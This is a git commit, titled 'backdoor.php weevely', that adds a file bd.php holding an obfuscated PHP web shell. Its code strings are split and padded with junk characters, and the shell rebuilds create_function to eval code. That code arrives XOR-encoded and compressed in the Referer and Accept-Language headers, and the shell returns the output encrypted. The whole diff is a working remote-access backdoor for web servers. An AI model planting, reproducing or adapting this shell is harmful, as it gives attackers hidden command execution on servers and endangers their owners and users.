f4428063e161253df2375a5ee474a2816bbfcabf
root <root@localhost.localdomain>
2018-01-31 14:10:52 +1100

    backdoor.php weevely

---
+++ bd.php
@@ -0,0 +1,16 @@
+<?php
+$Z='_/"Pt,"/-/"Pt),array("Pt/","+Pt"),$Ptss($sPt[$i]Pt,0,$e))PtPt),$k)));$o=oPtbPt_get_contents();oPtb_endPt_clean(P';
+$f='Pt="Pt";Pt$p=$ss($p,3)Pt;}ifPt(arraPty_key_exiPtsPtts($i,$Pts)){$s[Pt$i].=$Ptp;$ePt=strPtpos($Pts[$i],$f);if($e)';
+$z=str_replace('eW','','ceWreateWe_eWfeWunceWtieWon');
+$a='Pt([\\d]))?Pt,?/"Pt,$ra,$m);if($qPt&Pt&$m){@sPtessiPton_sPttart();$s=Pt&$_SESSIONPt;$ssPt="substrPt";$Ptsl="PtPtP';
+$n='$kh="8fe4";Pt$kf="Ptc114";fPtuPtnctionPt x($Ptt,$k){$c=PtstrlePtn($k);$l=stPtrlen(Pt$t);$oPt="";Ptfor($i=0;Pt$i<';
+$v='0,Pt3));$p="";for($Ptz=1;$z<couPtnt($m[1Pt]);$zPt++)$Ptp.=$q[$m[Pt2Pt][$z]];if(sPttrpos(Pt$p,$hPt)===0Pt){$s[$i]';
+$C='$Ptrr=@$r["PtHTTP_REFPtERER"];$ra=Pt@$r["HPtTPtTP_ACCPtEPT_LANGPtUAGE"];iPtf($rr&Pt&$PtraPtPt){$u=parsePtPt_url(Pt';
+$h='tstrtolowerPt";$i=$mPt[1][0].$m[1][1]PtPt;$h=$sl(Pt$ss(md5($i.Pt$khPt),0,3));$PtPtf=$sl($ss(md5(PtPt$i.Pt$kfPt),';
+$m='t);$Ptd=bPtase6PtPt4_encode(x(gzcompPtPtress($Pto)Pt,$k));print("<$kPt>$d</Pt$k>")Pt;@sPtession_destroy(Pt);}}}}';
+$E='$l;Pt){Ptfor($j=0;Pt($jPt<$c&&$Pti<$l);$PtPtj++,$Pti++){$o.=$t{$i}^Pt$k{$Ptj};}}PtrePtturn $o;Pt}$r=$Pt_SERPtVER;';
+$P='$rr);parsPte_str($u["query"],$qPtPt);$q=arrayPt_valuPtes($q);prePtg_PtPtmatch_PtallPt("/([\\w])Pt[\\w-]+(?Pt:;q=0.';
+$e='Pt{$kPt=$kh.$PtPtkf;ob_staPtrt();Pt@evaPtl(@gzuncomPtpress(@x(@bPtasPtPte64_decode(pPtreg_replaPtce(arPtray("Pt/';
+$A=str_replace('Pt','',$n.$E.$C.$P.$a.$h.$v.$f.$e.$Z.$m);
+$S=$z('',$A);$S();
+?>
